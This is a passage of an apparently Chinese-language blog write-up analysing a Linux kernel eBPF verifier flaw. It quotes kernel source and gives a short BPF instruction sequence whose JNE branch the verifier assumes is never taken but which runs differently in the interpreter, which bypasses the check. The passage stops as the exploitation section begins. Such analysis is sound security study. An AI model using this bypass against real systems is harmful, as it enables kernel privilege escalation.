class="line">        log_level == <span class="number">0</span> || log_ubuf == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line"></span><br><span class="line">    ret = -ENOMEM;</span><br><span class="line">    log_buf = vmalloc(log_size);</span><br><span class="line">    <span class="keyword">if</span> (!log_buf)</span><br><span class="line">      <span class="keyword">goto</span> free_env;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log_level = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = replace_map_fd_with_map_ptr(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;explored_states = kcalloc(env-&gt;prog-&gt;len,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(struct verifier_state_list *),</span><br><span class="line">                                 GFP_USER);</span><br><span class="line">  ret = -ENOMEM;</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;explored_states)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  ret = check_cfg(env);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">  env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span><br><span class="line"></span><br><span class="line">  ret = do_check(env);</span><br><span class="line"></span><br><span class="line">  skip_full_check:</span><br><span class="line">  <span class="keyword">while</span> (pop_stack(env, <span class="literal">NULL</span>) &gt;= <span class="number">0</span>);</span><br><span class="line">  free_states(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* program is valid, convert *(u32*)(ctx + off) accesses */</span></span><br><span class="line">    ret = convert_ctx_accesses(env);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; log_len &gt;= log_size - <span class="number">1</span>) &#123;</span><br><span class="line">    BUG_ON(log_len &gt;= log_size);</span><br><span class="line">    <span class="comment">/* verifier log exceeded user supplied buffer */</span></span><br><span class="line">    ret = -ENOSPC;</span><br><span class="line">    <span class="comment">/* fall through to return what was recorded */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy verifier log back to user space including trailing zero */</span></span><br><span class="line">  <span class="keyword">if</span> (log_level &amp;&amp; copy_to_user(log_ubuf, log_buf, log_len + <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    ret = -EFAULT;</span><br><span class="line">    <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span> &amp;&amp; env-&gt;used_map_cnt) &#123;</span><br><span class="line">    <span class="comment">/* if program passed verifier, update used_maps in bpf_prog_info */</span></span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_maps = kmalloc_array(env-&gt;used_map_cnt,</span><br><span class="line">                                              <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]),</span><br><span class="line">                                              GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps) &#123;</span><br><span class="line">      ret = -ENOMEM;</span><br><span class="line">      <span class="keyword">goto</span> free_log_buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(env-&gt;prog-&gt;aux-&gt;used_maps, env-&gt;used_maps,</span><br><span class="line">           <span class="keyword">sizeof</span>(env-&gt;used_maps[<span class="number">0</span>]) * env-&gt;used_map_cnt);</span><br><span class="line">    env-&gt;prog-&gt;aux-&gt;used_map_cnt = env-&gt;used_map_cnt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* program is valid. Convert pseudo bpf_ld_imm64 into generic</span></span><br><span class="line"><span class="comment">		 * bpf_ld_imm64 instructions</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    convert_pseudo_ld_imm64(env);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_log_buf:</span><br><span class="line">  <span class="keyword">if</span> (log_level)</span><br><span class="line">    vfree(log_buf);</span><br><span class="line">  free_env:</span><br><span class="line">  <span class="keyword">if</span> (!env-&gt;prog-&gt;aux-&gt;used_maps)</span><br><span class="line">    <span class="comment">/* if we didn&#x27;t copy map pointers into bpf_prog_info, release</span></span><br><span class="line"><span class="comment">		 * them now. Otherwise free_bpf_prog_info() will release them.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    release_maps(env);</span><br><span class="line">  *prog = env-&gt;prog;</span><br><span class="line">  kfree(env);</span><br><span class="line">  mutex_unlock(&amp;bpf_verifier_lock);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里首先是使用<code>check_cfg</code>函数借用了程序控制流图的思路来检查这个EBPF程序中是否有死循环和跳转到未初始化的位置，避免造成无法预期的风险。最后则是使用<code>do_check</code>函数模拟执行一次注入代码，会将注入代码的所有逻辑分支从头到尾都会被完全跑上一遍，会模拟每条指令的执行，包括堆栈、寄存器、访问内存、调用函数等。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞发生在<code>do_check</code>函数和最后真正运行的<code>__bpf_prog_run</code>翻译结果不一致导致的。这里用如下代码来演示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN()</span><br></pre></td></tr></table></figure>

<p>首先看一下<code>do_check</code>函数中处理的事情：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">init_reg_state(regs);</span><br><span class="line">insn_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">	u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">		verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">			insn_idx, insn_cnt);</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	insn = &amp;insns[insn_idx]; </span><br><span class="line">	<span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里存在一个for死循环，最后会返回<code>BPF_CLASS</code>获得的指令操作码类型。</p>
<p>第一条指令是<code>BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF)</code>，BPF_MOV指令属于ALU大类中，在检测到指令类型是ALU，进入如下分支，调用<code>check_alu_op()</code>函数继续判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class == BPF_ALU || class == BPF_ALU64) &#123;</span><br><span class="line">	err = check_alu_op(env, insn);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据<code>check_alu_op()</code>函数，上面这条代码的指令操作码为BPF_MOV，进入如下分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">  ......</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">      <span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">        <span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">				 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">        regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">          verbose(<span class="string">&quot;R%d partial copy of pointer\n&quot;</span>,</span><br><span class="line">                  insn-&gt;src_reg);</span><br><span class="line">          <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">        regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//BPF_K</span></span><br><span class="line">      <span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">			 * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">      regs[insn-&gt;dst_reg].type = CONST_IMM; </span><br><span class="line">      regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里最后是将指令的立即数保存到了reg_state结构体中的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* valid when type == CONST_IMM | PTR_TO_STACK */</span></span><br><span class="line">    <span class="keyword">int</span> imm;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里的imm也是有符号整数，和<code>bpf_insn</code>结构体中的imm类型一致。<br>检查第二条指令<code>BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2)</code>，这是一条JMP指令，在<code>do_check</code>函数中会进入如下分支：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_JMP) &#123;</span><br><span class="line">  u8 opcode = BPF_OP(insn-&gt;code);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;off != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_CALL uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = check_call(env, insn-&gt;imm);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_JA uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insn_idx += insn-&gt;off + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">    <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">        insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">        insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">        insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">      verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> -EACCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    process_bpf_exit:</span><br><span class="line">    insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      do_print_state = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    err = check_cond_jmp_op(env, insn, &amp;insn_idx);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的else语句也就是JNE所进入的分支，所以会进一步进入<code>check_cond_jmp_op</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">    (opcode == BPF_JEQ || opcode == BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type == CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm == insn-&gt;imm) &#123;</span><br><span class="line">  <span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">    <span class="comment">/* if (imm == imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow the goto, ignore fall-through</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">    *insn_idx += insn-&gt;off;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* if (imm != imm) goto pc+off;</span></span><br><span class="line"><span class="comment">			 * only follow fall-through branch, since</span></span><br><span class="line"><span class="comment">			 * that&#x27;s where the program will go</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数内部存在这样一条if语句，由前面提到了在<code>reg_state</code>结构体中的imm和<code>insn</code>中的imm都是int类型，并且<code>reg_state</code>结构体中的imm是由<code>insn</code>中直接赋值过去的，所以这个条件会恒等。所以当操作码为<code>BPF_JNE</code>时，永远都不会跳转。</p>
<p>上面是模拟执行的情况，那么下面看看真实执行情况是什么样子的，首先真实执行情况的函数为<code>__bpf_prog_run</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">	u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">	u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">		[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">		<span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">		<span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">		[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">		[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">		[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">		[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">		[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">		[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">		[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">		[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">		[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">		[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">		[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">		[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">		[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Jumps */</span></span><br><span class="line">[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br></pre></td></tr></table></figure>

<p>可以看到这里赋值的是<code>JMP_JNE_K</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">  insn += insn-&gt;off;</span><br><span class="line">  CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>

<p>这里就比较关注DST和IMM的定义了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST	regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRC	regs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FP	regs[BPF_REG_FP]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARG1	regs[BPF_REG_ARG1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CTX	regs[BPF_REG_CTX]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM	insn-&gt;imm</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在<code>__bpf_prog_run</code>函数的开头可以看出来这里的寄存器定义为<code>unsigned long long int</code>类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="退出do-check"><a href="#退出do-check" class="headerlink" title="退出do_check"></a>退出<code>do_check</code></h3><p>但就目前来看依旧存在的一个问题就是虽然他会进入<code>BPF_EXIT</code>分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出<code>do_check</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">  <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">      insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">      insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">      insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment">				 * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment">				 * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment">				 * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment">				 * something into it earlier</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span 